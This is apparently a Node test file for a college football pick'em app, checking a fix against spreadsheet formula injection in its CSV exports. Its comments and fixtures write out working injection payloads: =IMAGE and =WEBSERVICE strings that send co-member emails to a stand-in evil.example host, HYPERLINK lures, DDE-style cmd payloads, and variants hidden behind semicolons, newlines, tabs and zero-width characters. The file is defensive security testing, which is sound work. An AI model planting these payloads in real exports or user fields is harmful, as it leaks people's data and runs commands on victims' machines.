/**
 * CFB Pickems — csvinjecttest.mjs
 * ================================
 * SB-13 (Social Platform thread; security review finding PF-2, SP-54 design
 * stage) — spreadsheet FORMULA INJECTION through the commissioner's CSV
 * exports.
 *
 * Run:  node csvinjecttest.mjs
 * Also: TZ=UTC node csvinjecttest.mjs && TZ=America/Los_Angeles node csvinjecttest.mjs
 *
 * THE DEFECT
 * ----------
 * `csvCell()` in js/app.js escaped commas, quotes and newlines and nothing
 * else. Members control their own display name, nickname/initials and school,
 * and every CSV export writes those straight into a cell. A cell whose first
 * character is `=`, `+`, `-` or `@` (or a leading TAB / CR, which some
 * spreadsheet importers strip before looking) is parsed by Excel and Google
 * Sheets as a FORMULA. The Players CSV also carries every co-member's email —
 * data a member cannot otherwise read since migration 0007 — so a display
 * name like
 *     =IMAGE("https://evil.example/?"&E3)
 * makes the commissioner's own spreadsheet send a co-member's email to the
 * attacker the moment the file is opened.
 *
 * ROUND 2 (security PASS WITH CONDITIONS, 2026-10-01) — the CLASS, not one
 * reader. Excel in a `;`-list-separator locale splits each record on `;`, and
 * there our comma-mode opening `"` sits MID-field, so it is a literal character:
 * `Al;=WEBSERVICE(D2&ENCODEURL(CONCAT(A3:A9)));` becomes a formula field with no
 * quote needed, and an LF/CR inside a comma-quoted cell ENDS the record, so the
 * text after it is a fresh field start too. Section [7] reads every export the
 * way that Excel does.
 *
 * ROUND 3 (security F1/F2, 2026-10-01) — round 2's separator lookahead ran `\s*`,
 * which crosses CR/LF, so every newline in a long run re-scanned the rest of it:
 * QUADRATIC (40k LFs 1.75 s; a feedback `name` is uncapped, so a member could
 * freeze the commissioner's tab on export). The run between a separator and the
 * dangerous character now excludes CR/LF/TAB — each of those is its own
 * separator match — so the scan is linear ([8] times it). TAB joins the
 * separators, for TAB-splitting readers ([7] runs one).
 *
 * THE FIX UNDER TEST
 * ------------------
 *   LEAD   a string that starts — after any whitespace, `"` or zero-width
 *          characters — with = + - @ or a fullwidth ＝ ＋ － ＠, or that starts
 *          with TAB / CR / LF, gets a leading `'`.
 *   SEP    every `;`, TAB, CR, LF or CRLF followed — across spaces, `"` and
 *          zero-width characters only — by that same dangerous start gets a
 *          `'` right after it (so each `;`- or TAB-mode field starts with `'`).
 * Then the unchanged quote/escape rule. The guard lives in the one serializer
 * every export goes through (toCsv -> csvCell), never in the row builders —
 * those stay raw (loadtest [44], eptest [9] pin that).
 *
 * THE NUMBER POLICY (decided deliberately, SB-13)
 * -----------------------------------------------
 * The guard is decided by TYPE, not by how the text looks:
 *   - a real JS `number` is NEVER touched. String(number) has a closed
 *     alphabet — digits, `.`, `-`, `e`, `+`, `NaN`, `Infinity` — so it cannot
 *     carry a function call or a cell reference. Signed spreads (AD-03),
 *     tiebreaker deltas and scores all reach csvCell as numbers (the Supabase
 *     projection coerces every `num` column with Number()), so `-7.5` stays a
 *     number the spreadsheet can sort and sum.
 *   - EVERY OTHER TYPE is guarded on its String() form: a STRING that merely
 *     looks numeric (`"-7.5"`), and an array, object or BigInt (reviewer N1).
 *     Strings are where member input lives, and "does this look like a
 *     harmless number to Excel" is a locale-dependent parse (`-1,5`, `-$5`,
 *     `-5%`, `-1E5`) that a guard should not try to replicate. The cost — a
 *     literal apostrophe on a value that starts with `-`/`+`/`@` — is the
 *     standard OWASP trade-off and is accepted. So is the round-2 cost: a
 *     multi-line feedback line that begins "- " gains a `'` (pinned in [3]).
 *
 * SECTIONS
 *   1  csvCell() — every dangerous lead (incl. leading space / quote /
 *      zero-width / fullwidth / LF) is neutralized; non-number types guarded
 *   1b csvCell() — every `;` / CR / LF / CRLF field start inside a value
 *   2  csvCell() — real numbers (negatives included) stay unprefixed; a
 *      numeric-LOOKING string is still guarded (the policy above)
 *   3  csvCell() — ordinary text, `;`-bearing benign values and the
 *      pre-existing quote/escape rule are byte-identical to before
 *   4  End to end — the exfiltration shape itself: a hostile display name in
 *      the Players CSV, through the REAL button binding
 *   5  End to end — every other export button the commissioner panel binds
 *      (and both bundles), each with a hostile payload proven to reach it
 *   6  Structural — no CSV can bypass the guard: one Blob site, every
 *      downloadFile( is a matched .csv toCsv() call, the JSON backup or the
 *      definition, toCsv maps csvCell
 *   7  `;`-locale AND TAB-splitting readers — every export and both bundles:
 *      zero formula fields
 *   8  Linear time (F1) — 100k LF / CRLF / CR / TAB runs serialize in < 50 ms
 *
 * Special characters are built with String.fromCharCode() so this file holds
 * no invisible bytes.
 *
 * What only a spreadsheet can confirm: that Excel / Google Sheets display the
 * `'`-prefixed cell as inert text, and that a real `;`-locale Excel parses the
 * file the way [7]'s reader does. Node can only prove the bytes.
 */

import { readFile, readdir } from 'node:fs/promises';

// ── DOM / localStorage stubs (slatetest.mjs shape — registered elements that
//    remember listeners, so bindCommEventListeners() is driven for real) ──────
const store = new Map();
globalThis.localStorage = {
  getItem: k => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => store.set(k, String(v)),
  removeItem: k => store.delete(k),
  clear: () => store.clear(),
};

const registry = new Map();
function makeEl(id) {
  const listeners = new Map();
  const e = {
    id, value: '', checked: false, textContent: '', innerHTML: '', className: '',
    style: {}, dataset: {},
    classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
    addEventListener(type, fn) {
      if (!listeners.has(type)) listeners.set(type, []);
      listeners.get(type).push(fn);
    },
    removeEventListener() {},
    appendChild() {}, removeChild() {}, remove() {}, focus() {}, scrollTo() {}, click() {},
    insertAdjacentHTML() {},
    querySelector: () => null,
    querySelectorAll: () => [],
    closest: () => null,
    _fire(type, ev = {}) {
      const fns = listeners.get(type) || [];
      if (!fns.length) throw new Error(`csvinjecttest: nothing bound to '${type}' on #${id}`);
      for (const fn of fns) fn({ target: e, ...ev });
    },
  };
  return e;
}
function el(id) { if (!registry.has(id)) registry.set(id, makeEl(id)); return registry.get(id); }

globalThis.document = {
  addEventListener() {}, removeEventListener() {},
  getElementById: id => registry.get(id) || null,
  querySelector: sel => (typeof sel === 'string' && sel.startsWith('#') ? registry.get(sel.slice(1)) || null : null),
  querySelectorAll: () => [],
  createElement: () => makeEl('__detached__'),
  body: { classList: { add() {}, remove() {} }, appendChild() {}, removeChild() {}, innerHTML: '' },
  hidden: false,
};
globalThis.window = globalThis;
try { globalThis.navigator = { serviceWorker: undefined, clipboard: { writeText: async () => {} } }; }
catch { Object.defineProperty(globalThis, 'navigator', { value: { serviceWorker: undefined, clipboard: { writeText: async () => {} } }, configurable: true }); }
globalThis.requestAnimationFrame = fn => fn();
globalThis.fetch = async () => { throw new Error('network disabled in csvinjecttest'); };
globalThis.matchMedia = () => ({ matches: false });
globalThis.confirm = () => true;
globalThis.prompt = () => null;
globalThis.alert = () => {};
if (!globalThis.crypto?.randomUUID) globalThis.crypto = { randomUUID: () => 'uuid_' + Math.random().toString(36).slice(2) };

let pass = 0, fail = 0;
function assert(cond, label) {
  if (cond) { pass++; console.log('  ✅', label); }
  else { fail++; console.error('  ❌', label); }
}
const show = s => JSON.stringify(s);

const storage = await import('./js/storage.js');
const app = await import('./js/app.js');
const appJsSrc = await readFile(new URL('./js/app.js', import.meta.url), 'utf8');
const { csvCell, bindCommEventListeners } = app;

console.log('[csvinjecttest] app.js exports —', Object.keys(app).length);

// ── Special characters, built from code points (no invisible bytes in source) ─
const ch = c => String.fromCharCode(c);
const ZWSP = ch(0x200B), ZWNJ = ch(0x200C), ZWJ = ch(0x200D), WJ = ch(0x2060), BOM = ch(0xFEFF);
const FW_EQ = ch(0xFF1D), FW_PLUS = ch(0xFF0B), FW_MINUS = ch(0xFF0D), FW_AT = ch(0xFF20);
const NBSP = ch(0x00A0), IDSP = ch(0x3000);   // no-break space, ideographic space

// ── A strict RFC 4180 reader — what a COMMA-locale spreadsheet sees per cell ──
// toCsv() joins rows with CRLF and csvCell() quotes any cell holding a quote,
// comma, CR or LF, so a CRLF outside quotes is always a row boundary.
function parseCsv(text) {
  const rows = []; let row = []; let cell = ''; let inQ = false; let i = 0;
  while (i < text.length) {
    const c = text[i];
    if (inQ) {
      if (c === '"') {
        if (text[i + 1] === '"') { cell += '"'; i += 2; continue; }
        inQ = false; i++; continue;
      }
      cell += c; i++; continue;
    }
    if (c === '"' && cell === '') { inQ = true; i++; continue; }
    if (c === ',') { row.push(cell); cell = ''; i++; continue; }
    if (c === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i += 2; continue; }
    cell += c; i++;
  }
  row.push(cell); rows.push(row);
  return rows;
}

// ── A `;`-LOCALE Excel reader (round 2), and a TAB-splitting one (round 3) ──
// Separator `;` (or TAB). A `"` qualifies a field ONLY at field start; anywhere
// else it is a literal character. Outside a qualified field, CR, LF or CRLF ends
// the record — so an LF inside one of OUR comma-quoted cells (whose opening `"`
// is mid-field here) starts a new record, and therefore a new field.
function parseSep(text, sep) {
  const rows = []; let row = []; let cell = ''; let inQ = false; let atStart = true;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (inQ) {
      if (c === '"') { if (text[i + 1] === '"') { cell += '"'; i++; } else inQ = false; }
      else cell += c;
      continue;
    }
    if (c === '"' && atStart) { inQ = true; atStart = false; continue; }
    if (c === sep) { row.push(cell); cell = ''; atStart = true; continue; }
    if (c === '\r' || c === '\n') {
      row.push(cell); rows.push(row); row = []; cell = ''; atStart = true;
      if (c === '\r' && text[i + 1] === '\n') i++;
      continue;
    }
    cell += c; atStart = false;
  }
  row.push(cell); rows.push(row);
  return rows;
}
const parseSemi = text => parseSep(text, ';');
const parseTab = text => parseSep(text, '\t');

// A parsed field a spreadsheet would evaluate as a formula: its first real
// character — after whitespace, quotes and zero-width characters — is one of
// = + - @ or their fullwidth forms; in comma mode a bare leading TAB/CR/LF is
// also counted (an importer may strip it). A plain decimal number (`-7.5`)
// starts with `-` but parses as a NUMBER, not a formula — the policy's
// carve-out for real numbers.
const FORMULA_START = new RegExp('^[\\s"' + ZWSP + '-' + ZWJ + WJ + BOM + ']*[=+\\-@' + FW_EQ + FW_PLUS + FW_MINUS + FW_AT + ']');
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
const isFormulaCell = v => (FORMULA_START.test(v) || /^[\t\r\n]/.test(v)) && !PLAIN_NUMBER.test(v);
const isFormulaSemi = v => FORMULA_START.test(v) && !PLAIN_NUMBER.test(v);

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[1] csvCell() — every dangerous lead is neutralized…');
// ═════════════════════════════════════════════════════════════════════════════
{
  assert(typeof csvCell === 'function', 'csvCell() is reachable from the test (exported seam)');

  // One case per lead the findings name, each a realistic payload. Expected
  // values are the exact serialized bytes.
  const cases = [
    ['=', '=1+1',                              "'=1+1"],
    ['+', '+HYPERLINK("https://evil.example")', `"'+HYPERLINK(""https://evil.example"")"`],
    ['-', "-2+3+cmd|' /C calc'!A0",            "'-2+3+cmd|' /C calc'!A0"],
    ['@', '@SUM(1+1)',                         "'@SUM(1+1)"],
    // Round 3: TAB is also a separator (TAB-splitting readers), so the `=`
    // after it is a field start and is guarded too.
    ['TAB', '\t=1+1',                          "'\t'=1+1"],
    // Round 2: CR is also a record break for a `;`-locale reader, so the `=`
    // after it is a field start and is guarded too.
    ['CR', '\r=1+1',                           `"'\r'=1+1"`],
    // Round 2 widened lead (security conditions item 2).
    ['space', ' =1+1',                         "' =1+1"],
    ['spaces', '   @A1',                       "'   @A1"],
    ['quote', '"=1+1',                         `"'""=1+1"`],
    ['ZWSP', ZWSP + '=1+1',                    "'" + ZWSP + '=1+1'],
    ['ZWNJ', ZWNJ + '=1+1',                    "'" + ZWNJ + '=1+1'],
    ['ZWJ', ZWJ + '=1+1',                      "'" + ZWJ + '=1+1'],
    ['WJ', WJ + '=1+1',                        "'" + WJ + '=1+1'],
    ['BOM', BOM + '=1+1',                      "'" + BOM + '=1+1'],
    ['NBSP', NBSP + '=1+1',                    "'" + NBSP + '=1+1'],
    ['fullwidth =', FW_EQ + '1+1',             "'" + FW_EQ + '1+1'],
    ['fullwidth +', FW_PLUS + 'A1',            "'" + FW_PLUS + 'A1'],
    ['fullwidth -', FW_MINUS + 'A1',           "'" + FW_MINUS + 'A1'],
    ['fullwidth @', FW_AT + 'A1',              "'" + FW_AT + 'A1'],
    ['LF then =', '\n=1+1',                    `"'\n'=1+1"`],
    ['LF alone', '\nplain',                    `"'\nplain"`],
    ['TAB alone', '\tplain',                   "'\tplain"],
    ['CR alone', '\rplain',                    `"'\rplain"`],
    ['mixed prefix', ' \t"' + ZWSP + '=A1',    `"' \t'""` + ZWSP + '=A1"'],
  ];
  for (const [lead, input, expected] of cases) {
    const out = csvCell(input);
    assert(out === expected, `lead ${lead}: ${show(input)} -> ${show(expected)} (got ${show(out)})`);
  }

  // The exfiltration payload from the finding, verbatim shape: it carries
  // quotes, so the guard and the quote rule both act, and the apostrophe must
  // land INSIDE the opening quote (a leading `'` outside the quotes would break
  // the field, not neutralize it).
  const exfil = '=IMAGE("https://evil.example/?"&E3)';
  const exfilOut = csvCell(exfil);
  assert(exfilOut === `"'=IMAGE(""https://evil.example/?""&E3)"`,
    `the =IMAGE(...) exfil payload is prefixed inside the quotes (got ${show(exfilOut)})`);
  assert(parseCsv(exfilOut)[0][0] === "'" + exfil,
    'parsed back, the spreadsheet sees the payload with a leading apostrophe — inert text');

  const ws = '=WEBSERVICE("https://evil.example/?q="&E3),x';
  assert(parseCsv(csvCell(ws))[0][0] === "'" + ws,
    '=WEBSERVICE(...) with an embedded comma: still one cell, still prefixed');

  // Reviewer N1 — only a real `number` skips the guard. Every other type is
  // guarded on its String() form (kills the `typeof v === 'string'` mutant).
  assert(csvCell(['=1+1']) === "'=1+1", `an ARRAY whose String() is "=1+1" is guarded (got ${show(csvCell(['=1+1']))})`);
  assert(csvCell({ toString: () => '=1+1' }) === "'=1+1", 'an OBJECT whose String() is "=1+1" is guarded');
  assert(csvCell(BigInt(-5)) === "'-5", `a BigInt (-5n) is guarded — only typeof "number" skips (got ${show(csvCell(BigInt(-5)))})`);
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[1b] csvCell() — every `;` / CR / LF / CRLF field start inside a value…');
// ═════════════════════════════════════════════════════════════════════════════
{
  const cases = [
    ['the finding', 'Al;=WEBSERVICE(D2&ENCODEURL(CONCAT(A3:A9)));', "Al;'=WEBSERVICE(D2&ENCODEURL(CONCAT(A3:A9)));"],
    ['; space', 'x; =A1',                 "x;' =A1"],
    ['; quote', 'x;"=A1',                 `"x;'""=A1"`],
    ['; ZWSP', 'x;' + ZWSP + '=A1',       "x;'" + ZWSP + '=A1'],
    ['; fullwidth', 'x;' + FW_EQ + 'A1',  "x;'" + FW_EQ + 'A1'],
    ['; @', 'x;@SUM(A1)',                 "x;'@SUM(A1)"],
    ['; -', 'x;-2+3',                     "x;'-2+3"],
    ['; +', 'x;+A3',                      "x;'+A3"],
    ['lead and ;', '=x;=y;',              "'=x;'=y;"],
    ['empty segment', 'a;;=b',            "a;;'=b"],
    ['LF', 'x\n=A1',                      `"x\n'=A1"`],
    ['CRLF kept whole', 'x\r\n=A1',       `"x\r\n'=A1"`],
    ['CR', 'x\r=A1',                      `"x\r'=A1"`],
    // Round 3 (F1): the run between a separator and the dangerous character
    // never crosses CR/LF/TAB — each of those is its own separator — so the
    // `'` lands after the LAST separator, right before the field it guards.
    ['LF LF', 'x\n\n=A1',                 `"x\n\n'=A1"`],
    ['CRLF CRLF', 'x\r\n\r\n=A1',         `"x\r\n\r\n'=A1"`],
    ['; LF', 'x;\n=A1',                   `"x;\n'=A1"`],
    ['LF space quote', 'x\n "=A1',        `"x\n' ""=A1"`],
    // Round 3 (F2): TAB is a separator for TAB-splitting readers.
    ['TAB', 'x\t=1+1',                    "x\t'=1+1"],
    ['TAB space', 'x\t =A1',              "x\t' =A1"],
    ['TAB quote', 'x\t"=A1',              `"x\t'""=A1"`],
    ['TAB TAB', 'x\t\t=A1',               "x\t\t'=A1"],
    ['; TAB', 'x;\t=A1',                  "x;\t'=A1"],
    ['; space TAB', 'x; \t=A1',           "x; \t'=A1"],
    ['CRLF TAB', 'x\r\n\t=A1',            `"x\r\n\t'=A1"`],
    ['TAB fullwidth', 'x\t' + FW_AT + 'A1', "x\t'" + FW_AT + 'A1'],
    // Round 3: non-ASCII whitespace between a separator and the dangerous
    // start is still crossed — U+FEFF, NBSP and the ideographic space are all
    // in [^\S\r\n\t] (security's note; mutation T11 narrowed the run to ASCII
    // and nothing went red until these were added).
    ['; BOM', 'x;' + BOM + '=A1',         "x;'" + BOM + '=A1'],
    ['; NBSP', 'x;' + NBSP + '=A1',       "x;'" + NBSP + '=A1'],
    ['LF BOM', 'x\n' + BOM + '=A1',       `"x\n'` + BOM + '=A1"'],
    ['TAB ideographic space', 'x\t' + IDSP + '=A1', "x\t'" + IDSP + '=A1'],
  ];
  for (const [label, input, expected] of cases) {
    const out = csvCell(input);
    assert(out === expected, `sep ${label}: ${show(input)} -> ${show(expected)} (got ${show(out)})`);
  }
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[2] csvCell() — real numbers stay numeric; numeric-LOOKING strings are guarded…');
// ═════════════════════════════════════════════════════════════════════════════
{
  const nums = [
    [-7.5, '-7.5'],   // signed home-perspective spread (AD-03)
    [-3, '-3'],       // a negative delta
    [0, '0'],
    [12, '12'],
    [1.5, '1.5'],
    [-0.5, '-0.5'],
  ];
  for (const [n, expected] of nums) {
    const out = csvCell(n);
    assert(out === expected, `number ${n} -> ${show(expected)}, never prefixed (got ${show(out)})`);
  }
  // 1e21 stringifies as "1e+21": a `+` that is not a lead character.
  assert(csvCell(1e21) === '1e+21', 'a number whose text contains `+` mid-string is untouched');

  // The deliberate policy: TYPE decides, not appearance. A string is member
  // input until proven otherwise, so a numeric-looking string is guarded.
  assert(csvCell('-7.5') === "'-7.5", 'the STRING "-7.5" IS prefixed — type decides, not how the text looks');
  assert(csvCell('+1') === "'+1", 'the STRING "+1" IS prefixed');
  assert(csvCell('7.5') === '7.5', 'a numeric string with no dangerous lead is untouched');
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[3] csvCell() — ordinary text and the existing quote/escape rule are unchanged…');
// ═════════════════════════════════════════════════════════════════════════════
{
  const same = [
    'Drew', 'Notre Dame', 'Texas A&M', "O'Brien", 'Smith-Jones', 'a=b', 'drew@example.com',
    '2026-09-05T17:00:00.000Z', 'Week 1 — Sep 5', 'OSU -7.5', 'PK', 'yes', '',
    "'=already quoted", ' Drew',
    // Round 2: values that carry `;` but no dangerous field start.
    'Smith; Jr', 'a;b', 'a;b;c', 'ob_1; ob_2', 'x; 7.5', '5;6', 'kevin@nd.edu; drew@example.com',
    ';https://e.vil/?;',
    // Round 3: values that carry TAB but no dangerous field start.
    'a\tb', 'tab\tseparated\tplain', 'x\t7.5', 'x \t y',
  ];
  for (const s of same) assert(csvCell(s) === s, `${show(s)} passes through byte-identical`);
  assert(csvCell(null) === '' && csvCell(undefined) === '', 'null / undefined -> empty cell, as before');
  assert(csvCell(true) === 'true' && csvCell(false) === 'false', 'booleans stringify as before');
  assert(csvCell('a,b') === '"a,b"', 'a comma still forces quoting');
  assert(csvCell('say "hi"') === '"say ""hi"""', 'a quote is still doubled inside a quoted cell');
  assert(csvCell('line1\nline2') === '"line1\nline2"', 'a newline still forces quoting, and a plain next line is untouched');
  assert(csvCell('a\r\nb') === '"a\r\nb"', 'a CRLF followed by plain text is untouched');
  assert(csvCell('line1\n\nline2') === '"line1\n\nline2"', 'a blank line between plain lines is untouched');
  assert(csvCell('Broken, on iPhone: tapping "Submit" does nothing.') === '"Broken, on iPhone: tapping ""Submit"" does nothing."',
    'loadtest [44]\'s comma-and-quote feedback text serializes exactly as before');
  // The ACCEPTED round-2 cost, pinned so it is a decision and not a surprise:
  // a feedback line that begins "- " is a `;`-mode field start beginning `-`.
  assert(csvCell('fix:\n- tap Submit') === `"fix:\n'- tap Submit"`,
    'accepted cost: a multi-line feedback bullet line ("- ...") gains a leading apostrophe');
}

// ── End-to-end fixture: one FINAL week, hostile member-controlled text in
//    every column a member (or a manual-game commissioner entry) can reach ──
const WEEK = {
  weekId: 'ci_w1', weekNumber: 1, season: 2026, label: 'Week 1',
  status: 'final', dataSourceMode: 'manual',
  startDate: '2026-09-05', endDate: '2026-09-06',
  picksOpenAt: null, picksLockAt: null, lockedAt: null, finalizedAt: null,
  actualTiebreakerValue: 48, tiebreakerFinalized: true,
  extraPointEnabled: true, extraPointActual: 52,
  blurb: '', recap: '', groupId: null, isGroupTiebreaker: false,
};

const PAY = {
  exfil:   '=IMAGE("https://evil.example/?"&E3)',
  plus:    '+HYPERLINK("https://evil.example","click")',
  minus:   "-2+3+cmd|' /C calc'!A0",
  at:      '@SUM(1+1)*cmd|\' /C calc\'!A0',
  tab:     '\t=1+1',
  cr:      '\r=WEBSERVICE("https://evil.example")',
};
// Exact cell a COMMA-locale reader gets back for each PAY display name.
const EXPECT = {
  exfil: "'" + PAY.exfil, plus: "'" + PAY.plus, minus: "'" + PAY.minus, at: "'" + PAY.at,
  tab: "'\t'=1+1",
  cr: "'\r'=WEBSERVICE(\"https://evil.example\")",
};
// Round 2 display names (each <= 60 chars, the display_name cap): [raw, exact
// comma-locale cell]. These are the `;`-mode and widened-lead classes.
const PAY2 = {
  semi:      ['Al;=WEBSERVICE(D2&ENCODEURL(CONCAT(A3:A9)));', "Al;'=WEBSERVICE(D2&ENCODEURL(CONCAT(A3:A9)));"],
  semiSpace: ['Al; =A1', "Al;' =A1"],
  semiQuote: ['Al;"=A1', 'Al;\'"=A1'],
  semiZw:    ['Al;' + ZWSP + '=A1', "Al;'" + ZWSP + '=A1'],
  semiFw:    ['Al;' + FW_EQ + 'A1', "Al;'" + FW_EQ + 'A1'],
  lf:        ['Al\n=WEBSERVICE(D2)', "Al\n'=WEBSERVICE(D2)"],
  crlf:      ['Al\r\n=A1', "Al\r\n'=A1"],
  space:     [' =A1', "' =A1"],
  quote:     ['"=A1', '\'"=A1'],
  zwsp:      [ZWSP + '=A1', "'" + ZWSP + '=A1'],
  bom:       [BOM + '=A1', "'" + BOM + '=A1'],
  fwEq:      [FW_EQ + 'A1', "'" + FW_EQ + 'A1'],
  fwPlus:    [FW_PLUS + 'A1', "'" + FW_PLUS + 'A1'],
  fwMinus:   [FW_MINUS + 'A1', "'" + FW_MINUS + 'A1'],
  fwAt:      [FW_AT + 'A1', "'" + FW_AT + 'A1'],
  lfLead:    ['\n=A1', "'\n'=A1"],
  tabMid:    ['Al\t=WEBSERVICE(D2)', "Al\t'=WEBSERVICE(D2)"],
};
const BASE_PLAYERS = [
  { playerId: 'ci_p1', displayName: PAY.exfil, initials: '=1+1', almaMater: '@evil', email: 'victim1@example.com' },
  { playerId: 'ci_p2', displayName: PAY.plus,  initials: 'K2',  almaMater: PAY.minus, email: 'victim2@example.com' },
  { playerId: 'ci_p3', displayName: PAY.minus, initials: 'K3',  almaMater: 'Ohio State', email: 'victim3@example.com' },
  { playerId: 'ci_p4', displayName: PAY.at,    initials: 'K4',  almaMater: 'Purdue', email: 'victim4@example.com' },
  { playerId: 'ci_p5', displayName: PAY.tab,   initials: 'K5',  almaMater: 'Utah', email: 'victim5@example.com' },
  { playerId: 'ci_p6', displayName: PAY.cr,    initials: 'K6',  almaMater: 'USC', email: 'victim6@example.com' },
  // Round 2: one player per new class. q1 also carries `;=1` initials and the
  // reviewer's `;`-laden school; q2 a benign `Smith; Jr` school.
  ...Object.values(PAY2).map(([raw], i) => ({
    playerId: `ci_q${i + 1}`, displayName: raw,
    initials: i === 0 ? ';=1' : `Q${i + 1}`,
    almaMater: i === 0 ? ';https://e.vil/?;' : i === 1 ? 'Smith; Jr' : 'Utah',
    email: `q${i + 1}@example.com`,
  })),
];
const PLAYERS = BASE_PLAYERS.map(p => ({ ...p, active: true, createdAt: '2026-08-01T00:00:00.000Z', preferences: {} }));
// A manual game: team names, venue, conferences and league label are free text
// the commissioner types. The SIGNED spread is a real number (AD-03).
const HOSTILE_TEAM = '=HYPERLINK("https://evil.example","OSU")';
const GAME = {
  gameId: 'ci_g1', weekId: WEEK.weekId,
  homeTeam: HOSTILE_TEAM, awayTeam: 'Michigan', homeMascot: '@mascot', awayMascot: '',
  homeConference: 'Big;=1+1', awayConference: 'Sun\n=A1', homeRank: null, awayRank: null,
  kickoff: '2026-09-05T17:00:00.000Z', kickoffConfirmed: true, timeWindow: 'afternoon',
  spread: -7.5, lockedSpread: -7.5, favorite: HOSTILE_TEAM,
  homeScore: 31, awayScore: 20, status: 'final', actualWinner: HOSTILE_TEAM, atsWinner: HOSTILE_TEAM,
  isAlmaMaterGame: false, nationalTV: false, multiplier: 1,
  isManual: true, leagueLabel: '-MANUAL+1', venue: '@venue', neutralSite: false,
  dataSource: 'manual', dataQuality: 'confirmed', spreadSource: 'manual', espnEventId: null,
};
const FB2_BODY = 'fix:\n- tap Submit\n=WEBSERVICE(A1)';
const FB2_EXPECT = "fix:\n'- tap Submit\n'=WEBSERVICE(A1)";

function seedFixture() {
  localStorage.clear();
  storage.saveWeek(WEEK);
  storage.saveGame(GAME);
  for (const p of PLAYERS) storage.addPlayer(p);
  storage.saveAllPicks(PLAYERS.map((p, i) => ({
    pickId: `ci_pk${i}`, weekId: WEEK.weekId, gameId: GAME.gameId, playerId: p.playerId,
    selectedTeam: i % 2 ? 'Michigan' : HOSTILE_TEAM, submittedAt: '2026-09-04T00:00:00.000Z',
  })));
  PLAYERS.forEach((p, i) => {
    storage.setTiebreakerGuess(WEEK.weekId, p.playerId, 40 + i);
    storage.setExtraPointGuess(WEEK.weekId, p.playerId, 45 + i);
  });
  storage.saveAllWeeklyResults(WEEK.weekId, PLAYERS.map((p, i) => ({
    weekId: WEEK.weekId, playerId: p.playerId, displayName: p.displayName, rank: i + 1,
    correctPicks: i % 2 ? 0 : 1, incorrectPicks: i % 2 ? 1 : 0, correctCount: i % 2 ? 0 : 1, incorrectCount: i % 2 ? 1 : 0,
    noDecisions: 0, tiebreakerGuess: 40 + i, tiebreakerDelta: 8 - i,
    isWinner: i === 0, isLoser: i === 5, wonByTiebreaker: false,
  })));
  storage.saveObligation({
    obligationId: 'ci_ob1', type: 'weekly', weekId: WEEK.weekId,
    payerPlayerId: 'ci_p6', recipientPlayerId: 'ci_p1',
    amountOrPrize: '=1+1', status: 'unpaid', createdAt: '2026-09-07T00:00:00.000Z', paidAt: null,
    needsReview: false, voided: true, voidReason: '@reason', mergedInto: '', mergedFrom: [],
  });
  storage.saveObligation({
    obligationId: 'ci_ob2', type: 'weekly', weekId: WEEK.weekId,
    payerPlayerId: 'ci_q1', recipientPlayerId: 'ci_q6',
    amountOrPrize: '$5', status: 'unpaid', createdAt: '2026-09-07T00:00:00.000Z', paidAt: null,
    needsReview: false, voided: false, voidReason: 'ok;@x', mergedInto: '', mergedFrom: ['ci_obA', 'ci_obB'],
  });
  storage.clearFeedback();
  storage.appendFeedback({
    id: 'ci_fb1', submittedAt: '2026-09-06T00:00:00.000Z', name: PAY.exfil, kind: 'bug',
    weekId: WEEK.weekId, appVersion: 'v0.28.0', body: PAY.minus, memberId: 'ci_p1',
  });
  storage.appendFeedback({
    id: 'ci_fb2', submittedAt: '2026-09-06T00:00:00.000Z', name: PAY2.semi[0], kind: 'bug',
    weekId: WEEK.weekId, appVersion: 'v0.28.0', body: FB2_BODY, memberId: 'ci_q1',
  });
}

// Capture every Blob the app builds. downloadFile() is the only Blob site
// (section [6] proves that), so this sees every CSV byte a click produces.
const captured = [];
globalThis.Blob = class { constructor(parts, opts) { captured.push({ text: parts.join(''), type: opts?.type }); } };
if (!globalThis.URL) globalThis.URL = {};
globalThis.URL.createObjectURL = () => 'blob:csvinjecttest';
globalThis.URL.revokeObjectURL = () => {};

const BUTTONS = [
  'export-week-picks-csv-btn', 'export-week-slate-csv-btn', 'export-week-results-csv-btn',
  'export-week-dashboard-csv-btn', 'export-week-bundle-btn', 'export-players-csv-btn',
  'export-standings-csv-btn', 'export-extra-point-csv-btn', 'export-weekly-results-csv-btn',
  'export-obligations-csv-btn', 'export-feedback-csv-btn', 'export-full-csv-bundle-btn',
];
function bindExports() {
  registry.clear();
  for (const id of BUTTONS) el(id);
  bindCommEventListeners(WEEK, storage.getGames(WEEK.weekId), [], [], storage.getSettings(), [WEEK]);
}
function clickOne(id) {
  captured.length = 0;
  el(id)._fire('click');
  return captured.length === 1 ? captured[0].text : null;
}
const formulaCells = rows => rows.flat().filter(isFormulaCell);
const allCells = rows => rows.flat();
// Every export's bytes, kept for the `;`-locale pass in [7].
const exportCsv = {};
const bundleFiles = {};

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[4] End to end — the exfiltration shape: Players CSV, through the real button…');
// ═════════════════════════════════════════════════════════════════════════════
{
  seedFixture();
  bindExports();
  const csv = clickOne('export-players-csv-btn');
  exportCsv['export-players-csv-btn'] = csv || '';
  assert(typeof csv === 'string' && csv.length > 0, 'clicking 👥 Players CSV produced exactly one CSV download');
  const rows = parseCsv(csv || '');
  assert(rows.length === 1 + PLAYERS.length, `fixture check: header + ${PLAYERS.length} player rows (got ${rows.length})`);
  const header = rows[0] || [];
  const nameIdx = header.indexOf('Display Name');
  const emailIdx = header.indexOf('Email');
  assert(nameIdx > -1 && emailIdx > -1, 'fixture check: the Players CSV carries Display Name AND Email columns — the exfil precondition is real');
  const p1 = rows.find(r => r[0] === 'ci_p1') || [];
  assert(p1[emailIdx] === 'victim1@example.com', 'the co-member email is still exported verbatim (the fix neutralizes, it does not redact)');
  assert(p1[nameIdx] === EXPECT.exfil,
    `the =IMAGE(...) display name reaches the spreadsheet as inert text (got ${show(p1[nameIdx])})`);
  assert(p1[header.indexOf('Initials')] === "'=1+1", 'the member-controlled initials cell is guarded too');
